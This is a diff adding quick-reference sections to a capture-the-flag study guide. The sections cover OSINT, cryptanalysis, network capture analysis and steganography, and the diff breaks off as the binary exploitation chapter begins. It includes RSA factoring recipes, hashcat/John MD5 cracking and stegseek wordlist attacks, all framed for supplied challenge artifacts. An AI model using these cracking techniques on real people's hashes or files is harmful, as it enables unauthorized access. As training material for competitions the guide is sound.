+pdftotext -layout "$FILE" clue-text.txt
+python3 - <<'PY'
+from pathlib import Path
+text = Path('clue-text.txt').read_text(errors='replace')
+print(text[:12000])
+PY
+```
+
+**Look for:** names, exact phrases, dates and footnote URLs.
+**If not:** Windows PDF Viewer → Open → zoom the scanned page and transcribe distinctive text.
+
+<a id="10-osint--quick-search-saved-pages-and-exports"></a>
+
+## Quick: search saved pages and exports
+
+**Kali · ripgrep.** Input: directory of supplied HTML/JSON/text exports.
+
+```bash
+DIR='supplied'
+rg -n -i 'application/ld\+json|author|datePublished|dateModified|identifier|canonical' "$DIR"
+rg -n -o 'https?://[^"<>[:space:]]+' "$DIR"
+```
+
+**Look for:** stable IDs, original media URLs, aliases and publication claims.
+**If not:** inspect scripts/application state; a crawl timestamp is not a publication timestamp.
+
+<a id="10-osint--quick-expose-invisible-unicode"></a>
+
+## Quick: expose invisible Unicode
+
+**WSL · Python 3.** Input: UTF-8 text copied without normalization.
+
+```bash
+FILE='message.txt'
+python3 - "$FILE" <<'PY'
+import sys, unicodedata
+from pathlib import Path
+text = Path(sys.argv[1]).read_text(encoding='utf-8')
+for i, ch in enumerate(text):
+    if not ch.isascii() or not ch.isprintable():
+        print(i, f'U+{ord(ch):04X}', unicodedata.name(ch, 'UNNAMED'), repr(ch))
+tags = ''.join(chr(ord(c)-0xE0000) for c in text if 0xE0020 <= ord(c) <= 0xE007E)
+print('Unicode tag characters:', repr(tags))
+PY
+```
+
+**Look for:** tag characters, zero-width symbols or lookalike letters.
+**If not:** compare original spelling and context; arbitrary Unicode does not imply an encoding.
+
+<a id="10-osint--quick-search-the-web-with-a-specific-clue"></a>
+
+## Quick: search the web with a specific clue
+
+**Windows · Chrome.** Use ordinary permitted text searches; substitute a phrase transcribed from the artifact. Example search syntax:
+
+```text
+"North Pier Clock" "1998"
+"North Pier Clock" site:gov.uk
+"North Pier Clock" filetype:pdf
+```
+
+Chrome → address bar → enter the query → open original source → record URL/date. For a location, compare road layout, sign text and building shape on permitted maps; keep camera position separate from the pictured landmark.
+
+**Look for:** two independent details matching one candidate.
+**If not:** remove one uncertain word or translate visible text; do not upload the image to an analysis service.
+
+<a id="10-osint--quick-save-a-designated-page-or-rdap-response"></a>
+
+## Quick: save a designated page or RDAP response
+
+**Kali · curl.** Put the exact organizer-designated HTTPS URL on one line in `assigned-url.txt`; for RDAP, use the supplied RDAP lookup URL. This performs one request and does not follow redirects. [curl options](https://curl.se/docs/manpage.html).
+
+```bash
+URL=$(cat assigned-url.txt)
+curl --proto '=https' --max-time 20 --silent --show-error \
+  --dump-header response-headers.txt --output response-body.txt "$URL"
+```
+
+**Look for:** status, redirect location, linked identifiers and registration events.
+**If not:** read the error/status before repeating; shared hosting/registrars do not prove common ownership.
+
+<a id="10-osint--quick-inspect-dns-and-registration-exports"></a>
+
+## Quick: inspect DNS and registration exports
+
+**Kali · ripgrep.** Input: supplied zone, DNS, WHOIS or RDAP exports under `infrastructure`. `dig` and `whois` are not listed in this workbook; use saved evidence or the approved curl route above.
+
+```bash
+DIR='infrastructure'
+rg -n -i '\b(TXT|CNAME|MX|NS|SOA|registrar|nameserver|registration|expiration|eventDate)\b' "$DIR"
+```
+
+**Look for:** TXT fragments, aliases and dated changes.
+**If not:** request the challenge's supplied records; do not infer ownership from a shared IP.
+
+<a id="10-osint--quick-inspect-a-supplied-git-history"></a>
+
+## Quick: inspect a supplied Git history
+
+**Kali · Git.** Input: local repository containing `.git`.
+
+```bash
+DIR='repo'
+git -C "$DIR" log --all --format='%H %aI %an <%ae> %cn <%ce>'
+git -C "$DIR" log --all --diff-filter=D --name-status
+git -C "$DIR" log --all -p -- '*.txt' '*.md' '.mailmap'
+git -C "$DIR" remote -v
+```
+
+**Look for:** deleted clues, changing aliases and repository URLs; `remote -v` only reads configuration.
+**If not:** an exported/shallow copy may lack history. Author fields are user-controlled; corroborate them.
+
+<a id="10-osint--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="10-osint--osint-from-supplied-evidence"></a>
 
@@ -3436,10 +4390,216 @@ For each answer component, record the source, exact observation, transformation,
 
 Source material adapted: all five files in `ctf-osint/`. Agent automation, paid/API-key services, public image uploads, face recognition, credentialed Discord enumeration, live bot interaction, invasive location inference, and cross-challenge pivots were excluded. Their underlying local evidence-reading methods are retained where useful.
 
+</details>
+
 
 ---
 
 <a id="07-cryptography"></a>
+
+<a id="07-cryptography--cryptography"></a>
+
+# Cryptography
+
+Run Bash blocks in the named environment from the extracted guide root. Set each `FILE` to your supplied artifact; outputs are working copies. [Full reference](#07-cryptography--full-reference) · [Tool chooser](#tool-chooser--cryptography).
+
+<a id="07-cryptography--quick-inspect-a-public-key"></a>
+
+## Quick: inspect a public key
+
+**WSL · OpenSSL.** Input: PEM public key.
+
+```bash
+FILE='public.pem'
+openssl pkey -pubin -in "$FILE" -text -noout
+```
+
+**Look for:** modulus, exponent, key type and size.
+**If not:** a certificate needs `openssl x509`; raw integers belong in the RSA JSON below.
+
+<a id="07-cryptography--quick-decode-bytes-before-attacking-them"></a>
+
+## Quick: decode bytes before attacking them
+
+**WSL · Python 3.** Input: Base64 text; recipe also recognizes one gzip/zlib layer. Choose a new output directory each run.
+
+```bash
+FILE='message.txt'
+python3 recipes/layers.py "$FILE" --out crypto-decoded
+```
+
+For plain hexadecimal text:
+
+```bash
+FILE='hex.txt'
+python3 - "$FILE" <<'PY'
+from pathlib import Path
+import sys
+data = bytes.fromhex(Path(sys.argv[1]).read_text())
+Path('hex-decoded.bin').write_bytes(data)
+print(len(data), repr(data[:160]))
+PY
+```
+
+**Look for:** recognizable headers or plaintext.
+**If not:** inspect the new bytes; another decoder needs supporting evidence.
+
+<a id="07-cryptography--quick-decrypt-rsa-with-known-or-close-factors"></a>
+
+## Quick: decrypt RSA with known or close factors
+
+**WSL · Python 3.** Create `rsa.json` using supplied integers: `n`, `e`, `c`, optional prime factors `p`, `q`, optional plaintext byte `length`. This toy returns `A`:
+
+```bash
+cat > rsa-toy.json <<'JSON'
+{"n":3233,"e":17,"c":2790,"p":61,"q":53,"length":1}
+JSON
+python3 recipes/rsa.py rsa-toy.json --out rsa-toy.bin
+```
+
+Without factors, the recipe tries bounded Fermat factoring:
+
+```bash
+FILE='rsa.json'
+python3 recipes/rsa.py "$FILE" --steps 100000 --out rsa-plain.bin
+```
+
+**Look for:** `re-encryption: OK` and sensible bytes; padding remains intact.
+**If not:** check distinct prime factors, encoding, or the next RSA branches.
+
+<a id="07-cryptography--quick-find-a-shared-rsa-prime"></a>
+
+## Quick: find a shared RSA prime
+
+**WSL · Python 3.** Input: one decimal modulus per line in `moduli.txt`.
+
+```bash
+FILE='moduli.txt'
+python3 - "$FILE" <<'PY'
+from pathlib import Path
+from math import gcd
+import sys
+ns = [int(s) for s in Path(sys.argv[1]).read_text().split()]
+for i, n in enumerate(ns):
+    for j, other in enumerate(ns[:i]):
+        p = gcd(n, other)
+        if 1 < p < min(n, other):
+            print('rows', j+1, i+1, 'p', p, 'q', n//p)
+PY
+```
+
+**Look for:** a proper factor; put it and `n//p` into your RSA JSON.
+**If not:** duplicate moduli reveal no new factor; inspect exponent/message reuse.
+
+<a id="07-cryptography--quick-test-an-unpadded-small-exponent"></a>
+
+## Quick: test an unpadded small exponent
+
+**WSL · Python 3.** Input: `rsa.json` with integer `n`, `e`, `c`; bounded to `e <= 17`.
+
+```bash
+FILE='rsa.json'
+python3 - "$FILE" <<'PY'
+import json, sys
+from pathlib import Path
+d = json.loads(Path(sys.argv[1]).read_text())
+n, e, c = (int(d[k]) for k in ('n', 'e', 'c'))
+assert n > 1 and 2 <= e <= 17 and 0 <= c < n
+lo, hi = 0, 1 << ((c.bit_length()+e-1)//e)
+while lo < hi:
+    mid = (lo+hi+1)//2
+    if mid**e <= c: lo = mid
+    else: hi = mid-1
+if lo**e == c:
+    print(lo.to_bytes(max(1, (lo.bit_length()+7)//8), 'big'))
+else: print('No exact root: padding or modular wraparound may apply')
+PY
+```
+
+**Look for:** an exact root with meaningful bytes.
+**If not:** small `e` alone is insufficient; use the reference for broadcast/common-modulus cases.
+
+<a id="07-cryptography--quick-rank-single-byte-xor-candidates"></a>
+
+## Quick: rank single-byte XOR candidates
+
+**WSL · Python 3.** Input: raw ciphertext, already decoded from hex/Base64.
+
+```bash
+FILE='cipher.bin'
+python3 - "$FILE" <<'PY'
+from pathlib import Path
+import sys
+data = Path(sys.argv[1]).read_bytes()
+rows = []
+for key in range(256):
+    plain = bytes(b ^ key for b in data)
+    score = sum((32 <= b <= 126 or b in (9,10,13)) +
+                2*(b in b' etaoinshrdluETAOINSHRDLU') for b in plain)
+    rows.append((score, key, plain))
+for score, key, plain in sorted(rows, reverse=True)[:10]:
+    print(f'key={key:02x}', score, repr(plain[:200]))
+PY
+```
+
+**Look for:** coherent structure across the message; ranking is only a guess.
+**If not:** test repeating-key alignment or classical-cipher clues in the reference.
+
+<a id="07-cryptography--quick-detect-repeated-aes-size-blocks"></a>
+
+## Quick: detect repeated AES-size blocks
+
+**WSL · Python 3.** Input: raw ciphertext.
+
+```bash
+FILE='cipher.bin'
+python3 - "$FILE" <<'PY'
+from pathlib import Path
+from collections import Counter
+import sys
+data = Path(sys.argv[1]).read_bytes()
+for offset in range(16):
+    counts = Counter(data[i:i+16] for i in range(offset,len(data)-15,16))
+    repeats = sum(n-1 for n in counts.values())
+    print('offset', offset, 'repeats', repeats)
+PY
+```
+
+**Look for:** aligned repetitions supporting an ECB hypothesis.
+**If not:** compare nonce/IV generation; CBC/CTR/oracle techniques require the exact protocol.
+
+<a id="07-cryptography--quick-crack-a-confirmed-raw-md5-hash"></a>
+
+## Quick: crack a confirmed raw MD5 hash
+
+**Kali · hashcat / John.** Input: one unsalted MD5 hex digest per line in `hashes.txt`; one candidate password per line in `words.txt`. Mode 0 is specifically raw MD5; 32 hex characters alone do not identify it. [Mode reference](https://hashcat.net/wiki/doku.php?id=example_hashes).
+
+```bash
+FILE='hashes.txt'
+WORDS='words.txt'
+hashcat -I
+hashcat -m 0 -a 0 "$FILE" "$WORDS"
+hashcat -m 0 "$FILE" --show
+```
+
+If hashcat has no usable backend:
+
+```bash
+FILE='hashes.txt'
+WORDS='words.txt'
+john --format=raw-md5 --wordlist="$WORDS" "$FILE"
+john --show --format=raw-md5 "$FILE"
+```
+
+**Look for:** a recovered candidate verified against the challenge.
+**If not:** distinguish wrong format from an exhausted wordlist before adding guesses.
+
+<a id="07-cryptography--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="07-cryptography--cryptography-recover-the-structure-before-the-secret"></a>
 
@@ -4079,10 +5239,171 @@ If a solver stalls, reduce a toy instance first. Wrong endianness, the wrong mod
 
 The chapter merges the source skill overview, classic/historical ciphers, RSA, DH, PRNG, stream, modern-mode and MAC notes. Specialized topics continue in [Advanced cryptography](#14-advanced-crypto); every crypto source file has a disposition in the coverage manifest.
 
+</details>
+
 
 ---
 
 <a id="11-miscellaneous"></a>
+
+<a id="11-miscellaneous--miscellaneous"></a>
+
+# Miscellaneous
+
+Run Bash in the named environment, from the extracted guide root for `recipes/` commands. Set each `FILE` to your artifact. [Full reference](#11-miscellaneous--full-reference) includes RF, games, constraint solvers and complete jail examples.
+
+<a id="11-miscellaneous--quick-identify-unfamiliar-bytes"></a>
+
+## Quick: identify unfamiliar bytes
+
+**WSL · xxd / strings.** Input: raw artifact.
+
+```bash
+FILE='artifact.bin'
+xxd -l 128 "$FILE"
+strings -a -n 6 "$FILE" | head -n 50
+```
+
+**Kali · file / 7-Zip.** Check container recognition without extracting:
+
+```bash
+FILE='artifact.bin'
+file "$FILE"
+7z l "$FILE"
+```
+
+**Look for:** actual signatures, embedded names and unexpectedly large members.
+**If not:** inspect byte distribution and source; the extension may be misleading.
+
+<a id="11-miscellaneous--quick-decode-one-justified-layer"></a>
+
+## Quick: decode one justified layer
+
+**WSL · Python 3.** Input: Base64 text. Output directory must be new; recipe keeps decoded/compressed layers separately.
+
+```bash
+FILE='message.txt'
+python3 recipes/layers.py "$FILE" --out misc-decoded
+```
+
+**Look for:** a coherent new header or readable text.
+**If not:** check hex, binary digits or Unicode in the reference; do not stack arbitrary decoders.
+
+<a id="11-miscellaneous--quick-inspect-json-without-executing-it"></a>
+
+## Quick: inspect JSON without executing it
+
+**WSL · jq.** Input: JSON document.
+
+```bash
+FILE='challenge.json'
+jq 'type' "$FILE"
+jq 'keys' "$FILE"
+jq . "$FILE"
+```
+
+**Look for:** arrays, encoded strings, coordinates and numeric bounds.
+**If not:** inspect the first bytes for compression, JSON Lines or malformed syntax; never use `eval` to parse data.
+
+<a id="11-miscellaneous--quick-preserve-duplicate-archive-members"></a>
+
+## Quick: preserve duplicate archive members
+
+**WSL · Python 3.** Input: TAR, TAR.GZ or another tarfile-supported compression. New output directory required; numbered files preserve duplicate names.
+
+```bash
+FILE='bundle.tar'
+python3 recipes/tar_keep.py "$FILE" --out misc-tar-parts
+```
+
+**Look for:** repeated original names in `manifest.jsonl`, differing content or ordered fragments.
+**If not:** use the matching archive format; ordinary extraction can overwrite duplicates.
+
+<a id="11-miscellaneous--quick-reconstruct-a-binary-qr-grid"></a>
+
+## Quick: reconstruct a binary QR grid
+
+**WSL · Python 3 / ZBar.** Input `grid.txt`: equal-length rows containing only `0`/`1`, where `1` means black. Adds a four-module white border.
+
+```bash
+FILE='grid.txt'
+python3 - "$FILE" <<'PY'
+from pathlib import Path
+import sys
+rows = Path(sys.argv[1]).read_text().split()
+assert rows and len(rows) == len(rows[0]) <= 177
+assert all(len(r) == len(rows[0]) and set(r) <= {'0','1'} for r in rows)
+size, scale = len(rows)+8, 8
+pixels = bytearray()
+for y in range(size):
+    line = bytes(0 if 4 <= y < size-4 and 4 <= x < size-4 and rows[y-4][x-4] == '1' else 255 for x in range(size))
+    pixels.extend(b''.join(bytes([v])*scale for v in line)*scale)
+Path('grid.pgm').write_bytes(f'P5\n{size*scale} {size*scale}\n255\n'.encode()+pixels)
+PY
+zbarimg --raw grid.pgm
+```
+
+**Look for:** decoded payload matching the challenge.
+**If not:** verify finder squares, row order and polarity before modifying modules.
+
+<a id="11-miscellaneous--quick-inspect-audio-channels-and-duration"></a>
+
+## Quick: inspect audio channels and duration
+
+**WSL · Python 3.** Input: uncompressed PCM WAV.
+
+```bash
+FILE='audio.wav'
+python3 - "$FILE" <<'PY'
+import sys, wave
+with wave.open(sys.argv[1], 'rb') as w:
+    print('channels', w.getnchannels(), 'sample bytes', w.getsampwidth())
+    print('rate', w.getframerate(), 'frames', w.getnframes())
+    print('seconds', w.getnframes()/w.getframerate())
+PY
+```
+
+**Kali · Audacity:** File → Open → select audio → track dropdown → Spectrogram → zoom suspicious interval; inspect channels separately.
+
+**Look for:** tone pairs, Morse timing, repeated bursts or drawn text.
+**If not:** compressed audio needs format-aware inspection; see the reference for PCM/IQ layout checks.
+
+<a id="11-miscellaneous--quick-inspect-a-python-jail-before-probing"></a>
+
+## Quick: inspect a Python jail before probing
+
+**Kali · ripgrep.** Input: supplied jail source; this reads it without running it.
+
+```bash
+FILE='jail.py'
+rg -n 'eval|exec|compile|__builtins__|globals|locals|ast\.|audit|normalize|encode|len\(|input\(' "$FILE"
+```
+
+**Look for:** parser stage, allowed names, length limit and persistent state.
+**If not:** read the full source and protocol; version-specific object indices are unreliable.
+
+<a id="11-miscellaneous--quick-enumerate-a-known-one-byte-vm"></a>
+
+## Quick: enumerate a known one-byte VM
+
+**WSL · Python 3.** Input: JSON `program` array using the recipe's `LOAD_INPUT`, `XOR`, `ADD`, `ROL`, `CMP`, `HALT` operations. This toy returns byte `K`; replace its instructions only after recovering opcode semantics.
+
+```bash
+cat > vm-toy.json <<'JSON'
+{"program":[["LOAD_INPUT"],["XOR",35],["ADD",7],["CMP",111],["HALT"]]}
+JSON
+python3 recipes/vm_byte.py vm-toy.json
+```
+
+**Look for:** a candidate passing every comparison with a reproducible trace.
+**If not:** verify overflow, rotation direction and state resets; larger games need an explicit state model.
+
+<a id="11-miscellaneous--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="11-miscellaneous--miscellaneous-turn-unfamiliar-artifacts-into-a-small-model"></a>
 
@@ -4656,10 +5977,186 @@ Record each solve as input artifact/hash, interpretation, exact transformation o
 
 The 14 source files in `ctf-misc/` are merged here: overview; encodings and advanced formats; audio and RF; Python/Bash jails; games/VMs parts 1–4; DNS; CTFd navigation; and Linux privilege puzzles. Overlapping network, media, crypto, and reverse-engineering details are cross-category material rather than new official event categories.
 
+</details>
+
 
 ---
 
 <a id="04-network"></a>
+
+<a id="04-network--network-captures"></a>
+
+# Network captures
+
+[Tool placement and competition rules](#00-tool-rules). All commands read supplied captures offline. Enter observed paths, stream numbers and filters when prompted.
+
+<a id="04-network--quick-find-the-interesting-conversation"></a>
+
+## Quick: find the interesting conversation
+
+**Windows · PowerShell / TShark**
+
+```powershell
+$tshark = 'C:\Program Files\Wireshark\tshark.exe'
+$file = Read-Host 'Capture path'
+& $tshark -n -r $file -q -z io,phs
+& $tshark -n -r $file -q -z conv,tcp
+& $tshark -n -r $file -q -z conv,udp
+& $tshark -n -r $file -q -z endpoints,ip
+```
+
+**Windows · Wireshark:** File → Open → capture; Statistics → Protocol Hierarchy, then Conversations. Select a TCP row → Follow Stream.
+
+**Look for:** unusual protocols, byte-heavy flows and endpoint pairs.
+**If not:** inspect other interfaces and UDP conversations.
+
+<a id="04-network--quick-list-http-requests-and-export-files"></a>
+
+## Quick: list HTTP requests and export files
+
+**Windows · PowerShell / TShark**
+
+```powershell
+$tshark = 'C:\Program Files\Wireshark\tshark.exe'
+$file = Read-Host 'Capture path'
+$out = Read-Host 'New HTTP export directory'
+New-Item -ItemType Directory -Path $out | Out-Null
+& $tshark -n -r $file -Y http.request -T fields -E header=y `
+  -e frame.number -e tcp.stream -e http.request.method -e http.host -e http.request.uri
+& $tshark -n -r $file --export-objects "http,$out"
+```
+
+**Look for:** downloads, POST bodies, filenames and configuration data.
+**If not:** uploads may require Follow → TCP Stream; export objects does not recover every upload.
+
+<a id="04-network--quick-recover-one-tcp-stream"></a>
+
+## Quick: recover one TCP stream
+
+**Windows · PowerShell / TShark**
+
+```powershell
+$tshark = 'C:\Program Files\Wireshark\tshark.exe'
+$file = Read-Host 'Capture path'
+$stream = Read-Host 'Observed TCP stream number'
+& $tshark -n -r $file -q -z "follow,tcp,ascii,$stream"
+& $tshark -n -r $file -Y "tcp.stream == $stream && tcp.len > 0" `
+  -T fields -E header=y -E 'separator=,' -E quote=d `
+  -e frame.number -e ip.src -e tcp.seq_raw -e tcp.len -e tcp.payload |
+  Set-Content -Encoding ascii .\segments.csv
+```
+
+**Windows · Wireshark:** filter `tcp.stream == 3` using your stream number → select packet → Follow → TCP Stream → choose one direction → Show data as Raw → Save as.
+
+**Look for:** complete application framing and consistent sequence ranges.
+**If not:** check gaps/retransmissions; concatenating packet payloads is not reassembly.
+
+<a id="04-network--quick-decrypt-tls-using-supplied-secrets"></a>
+
+## Quick: decrypt TLS using supplied secrets
+
+**Windows · PowerShell / TShark**
+
+```powershell
+$tshark = 'C:\Program Files\Wireshark\tshark.exe'
+$file = Read-Host 'Capture path'
+$keys = Read-Host 'Supplied NSS keylog path'
+$out = Read-Host 'New decrypted HTTP output directory'
+New-Item -ItemType Directory -Path $out | Out-Null
+& $tshark -n -r $file -o "tls.keylog_file:$keys" -Y http
+& $tshark -n -r $file -o "tls.keylog_file:$keys" --export-objects "http,$out"
+```
+
+**Look for:** decoded HTTP and authenticated TLS records.
+**If not:** match handshake/client random; RSA server keys cannot decrypt ECDHE or TLS 1.3.
+
+<a id="04-network--quick-extract-dns-and-icmp-clues"></a>
+
+## Quick: extract DNS and ICMP clues
+
+**Windows · PowerShell / TShark**
+
+```powershell
+$tshark = 'C:\Program Files\Wireshark\tshark.exe'
+$file = Read-Host 'Capture path'
+& $tshark -n -r $file -Y 'dns.flags.response == 0' `
+  -T fields -e frame.number -e dns.qry.name |
+  Set-Content -Encoding ascii .\dns.tsv
+& $tshark -n -r $file -Y 'icmp.type == 8' `
+  -T fields -e frame.number -e icmp.ident -e icmp.seq -e data.data |
+  Set-Content -Encoding ascii .\icmp.tsv
+```
+
+**Look for:** encoded labels, sequence fields, repeated lengths and unusual payloads.
+**If not:** inspect timing and TXT answers; preserve ordering and distinguish retries.
+
+<a id="04-network--quick-inspect-authentication-exchanges"></a>
+
+## Quick: inspect authentication exchanges
+
+**Windows · PowerShell / TShark**
+
+```powershell
+$tshark = 'C:\Program Files\Wireshark\tshark.exe'
+$file = Read-Host 'Capture path'
+& $tshark -n -r $file -Y ntlmssp -V |
+  Set-Content -Encoding UTF8 .\ntlm-details.txt
+& $tshark -n -r $file -Y 'smb2 || dcerpc || ntp || radius' -V |
+  Set-Content -Encoding UTF8 .\auth-details.txt
+```
+
+**Look for:** usernames, domains and paired challenge/response messages.
+**If not:** follow one exchange; do not mix different sessions or contact captured endpoints.
+
+<a id="04-network--quick-make-searchable-protocol-logs"></a>
+
+## Quick: make searchable protocol logs
+
+**WSL · Zeek**
+
+```bash
+read -r -p 'Absolute capture path: ' FILE
+read -r -p 'New log directory: ' OUT
+mkdir "$OUT" && (cd "$OUT" && zeek -r "$FILE")
+```
+
+**Kali · tcpdump**, for a short packet view:
+
+```bash
+read -r -p 'Capture path: ' FILE
+tcpdump -nn -r "$FILE" -c 30
+tcpdump -nn -A -r "$FILE" -c 30 'tcp port 80'
+```
+
+**Look for:** `conn.log`, `dns.log`, `http.log`, endpoints and timestamps.
+**If not:** inspect the packet-level stream; encrypted application content stays hidden.
+
+<a id="04-network--quick-recover-voice-or-keyboard-evidence"></a>
+
+## Quick: recover voice or keyboard evidence
+
+**Windows · Wireshark:** Telephony → RTP → RTP Streams → select stream → Analyze / Play Streams → export audio. Check codec and sequence gaps.
+
+**Windows · PowerShell / TShark**, after identifying the USB input device/endpoint:
+
+```powershell
+$tshark = 'C:\Program Files\Wireshark\tshark.exe'
+$file = Read-Host 'Capture path'
+$filter = Read-Host 'Display filter identifying the observed USB input endpoint'
+& $tshark -n -r $file -Y "($filter) && usb.capdata" `
+  -T fields -e frame.number -e usb.capdata |
+  Set-Content -Encoding ascii .\hid.tsv
+```
+
+**Look for:** descriptor-defined reports; boot keyboards commonly use eight bytes.
+**If not:** check report IDs/layout; use the full reference for UART, mouse and custom signal decoding.
+
+<a id="04-network--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="04-network--network-captures-and-hardware-signals"></a>
 
@@ -4764,7 +6261,7 @@ Concatenating every `tcp.payload` duplicates retransmissions, interleaves both d
 
 ```powershell
 & $tshark -n -r capture.pcapng -Y 'tcp.stream == 3 && tcp.len > 0' `
-  -T fields -E header=y -E separator=, -E quote=d `
+  -T fields -E header=y -E 'separator=,' -E quote=d `
   -e frame.number -e ip.src -e tcp.seq_raw -e tcp.len -e tcp.payload |
   Set-Content -Encoding ascii out\segments.csv
 ```
@@ -5108,10 +6605,192 @@ Brotli has no universal fixed file magic. An anomalous repeated compressed block
 
 Source material adapted: `ctf-forensics/network.md`, `network-advanced.md`, `peripheral-capture.md`, `signals-and-hardware.md`, plus network portions of `linux-forensics.md` and `SKILL.md`. PDF overlap is covered in the steganography chapter. Active interception, third-party vendor lookups, public decryption services, and unsupported installers were removed.
 
+</details>
+
 
 ---
 
 <a id="05-steganography"></a>
+
+<a id="05-steganography--steganography"></a>
+
+# Steganography
+
+[Tool placement and competition rules](#00-tool-rules). Preserve originals. Enter paths when prompted; run `recipes/` commands from the extracted guide root.
+
+<a id="05-steganography--quick-inspect-metadata-and-embedded-signatures"></a>
+
+## Quick: inspect metadata and embedded signatures
+
+**WSL · ExifTool, xxd, strings, binwalk**
+
+```bash
+read -r -p 'Carrier file path: ' FILE
+exiftool -a -u -g1 "$FILE"
+xxd -l 256 "$FILE"
+strings -a -n 6 "$FILE"
+binwalk "$FILE"
+```
+
+For a JPEG thumbnail:
+
+```bash
+read -r -p 'JPEG path: ' FILE
+exiftool -b -ThumbnailImage "$FILE" > thumbnail.jpg
+```
+
+**Look for:** comments, passwords, embedded headers and a different thumbnail crop.
+**If not:** inspect structural boundaries; binwalk matches can be false positives.
+
+<a id="05-steganography--quick-inspect-png-structure-and-appended-bytes"></a>
+
+## Quick: inspect PNG structure and appended bytes
+
+**Kali · pngcheck**
+
+```bash
+read -r -p 'PNG path: ' FILE
+pngcheck -v "$FILE"
+```
+
+**WSL · Python**
+
+```bash
+read -r -p 'PNG path: ' FILE
+python3 recipes/png_tail.py "$FILE" --out png-trailer.bin &&
+xxd -l 128 png-trailer.bin &&
+strings -a -n 6 png-trailer.bin
+```
+
+**Look for:** chunk/CRC errors and nonempty data after the true IEND.
+**If not:** inspect bitplanes; do not globally replace header-like byte strings.
+
+<a id="05-steganography--quick-extract-a-promising-pngbmp-bitplane"></a>
+
+## Quick: extract a promising PNG/BMP bitplane
+
+**WSL · zsteg**
+
+```bash
+read -r -p 'PNG or BMP path: ' FILE
+zsteg -a "$FILE"
+```
+
+Copy a promising selector from that output:
+
+```bash
+read -r -p 'PNG or BMP path: ' FILE
+read -r -p 'Exact zsteg selector from analysis: ' SELECTOR
+zsteg -E "$SELECTOR" "$FILE" > extracted.bin
+xxd -l 128 extracted.bin
+strings -a -n 6 extracted.bin
+```
+
+**Look for:** a valid file or structured message, not isolated printable fragments.
+**If not:** inspect channels visually in Kali StegSolve: File → Open → cycle views with arrows.
+
+<a id="05-steganography--quick-open-a-steghide-carrier"></a>
+
+## Quick: open a steghide carrier
+
+**Kali · steghide**, JPEG/BMP/WAV/AU; enter the clue-derived password at the prompt.
+
+```bash
+read -r -p 'Carrier path: ' FILE
+steghide info "$FILE"
+steghide extract -sf "$FILE" -xf recovered.bin
+```
+
+**Kali · stegseek**, using your clue-derived local wordlist:
+
+```bash
+read -r -p 'Carrier path: ' FILE
+read -r -p 'Password wordlist path: ' WORDS
+stegseek "$FILE" "$WORDS" recovered-from-wordlist.bin
+```
+
+**Look for:** an extracted file with a valid format.
+**If not:** a failed password does not prove absence; PNG needs another route.
+
+<a id="05-steganography--quick-decode-a-visible-barcode-or-qr"></a>
+
+## Quick: decode a visible barcode or QR
+
+**WSL · ZBar**
+
+```bash
+read -r -p 'Barcode image path: ' FILE
+zbarimg --raw "$FILE"
+```
+
+**Look for:** complete decoded text or a next-layer encoding.
+**If not:** inspect orientation, missing finder patterns, contrast and quiet border; keep repairs separate.
+
+<a id="05-steganography--quick-inspect-a-pdf-beyond-the-rendered-page"></a>
+
+## Quick: inspect a PDF beyond the rendered page
+
+**WSL · pdftotext, qpdf**
+
+```bash
+read -r -p 'PDF path: ' FILE
+pdftotext -layout "$FILE" pdf-text.txt
+qpdf --check "$FILE"
+qpdf --qdf --object-streams=disable "$FILE" expanded.pdf
+strings -a -n 6 expanded.pdf > pdf-strings.txt
+```
+
+**Look for:** text hidden by layout, annotations, object streams and attachments.
+**If not:** compare rendered pages with extracted text; consult the full reference for object-level recovery.
+
+<a id="05-steganography--quick-reveal-audio-tones-or-spectrogram-text"></a>
+
+## Quick: reveal audio tones or spectrogram text
+
+**Kali · SoX**
+
+```bash
+read -r -p 'Audio path: ' FILE
+sox "$FILE" -n spectrogram -o spectrogram.png
+sox "$FILE" reversed.wav reverse
+```
+
+For suspected standard DTMF:
+
+```bash
+read -r -p 'Audio path: ' FILE
+sox "$FILE" -t raw -r 22050 -e signed-integer -b 16 -c 1 - |
+  multimon-ng -t raw -a DTMF -
+```
+
+**Kali · Audacity:** File → Open → select audio → track dropdown → Spectrogram; zoom the suspicious interval.
+
+**Look for:** letter shapes, reversed speech or stable tone pairs.
+**If not:** inspect separate channels; preserve original PCM for sample-bit analysis.
+
+<a id="05-steganography--quick-extract-video-frames-and-audio-tracks"></a>
+
+## Quick: extract video frames and audio tracks
+
+**Kali · FFmpeg** — inspect stream listings before selecting tracks.
+
+```bash
+read -r -p 'Video path: ' FILE
+ffprobe -hide_banner "$FILE"
+read -r -p 'New frames directory: ' OUT
+mkdir "$OUT" && ffmpeg -i "$FILE" -map 0:v:0 -fps_mode passthrough "$OUT/frame-%06d.png"
+ffmpeg -i "$FILE" -map 0:a:0 -c:a pcm_s16le track0.wav
+```
+
+**Look for:** single-frame messages, secondary streams and changing pixels.
+**If not:** compare frames/channels using the full reference; pixel exports omit container padding.
+
+<a id="05-steganography--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="05-steganography--steganography-documents-and-media"></a>
 
@@ -5642,10 +7321,190 @@ For keyboard audio, manually segment keypress transients, compare waveform/spect
 
 Source material adapted: `ctf-forensics/steganography.md`, `stego-image.md`, `stego-advanced.md`, `stego-advanced-2.md`, `3d-printing.md`, and media portions of `signals-and-hardware.md`/`SKILL.md`. Unsupported online decoders, blanket installers, genetic/ML solvers, and sample-specific assumptions were removed or replaced with bounded local workflows.
 
+</details>
+
 
 ---
 
 <a id="08-binary-exploitation"></a>
+
+<a id="08-binary-exploitation--binary-exploitation"></a>
+
+# Binary exploitation
+
+Local practice or assigned targets only; [event rules](#competition). Pwn is advanced preparation. Run recipes from the extracted guide root containing `recipes`. [Tool chooser](#tool-chooser--binary-exploitation).
+
+<a id="08-binary-exploitation--quick-identify-the-target-and-mitigations"></a>
+
+## Quick: identify the target and mitigations
+
+**Kali · Bash**
+
+```bash
+read -r -p 'Local ELF path: ' FILE
+file "$FILE"
